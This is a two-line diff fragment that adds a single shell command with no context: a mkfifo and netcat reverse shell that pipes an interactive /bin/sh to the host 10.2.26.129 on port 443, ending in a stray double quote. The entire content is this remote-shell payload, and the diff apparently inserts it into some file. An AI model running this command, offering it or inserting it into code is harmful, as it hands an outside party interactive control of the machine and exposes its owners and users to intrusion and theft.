@@ -1,0 +1,2 @@
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.2.26.129 443 >/tmp/f"
+
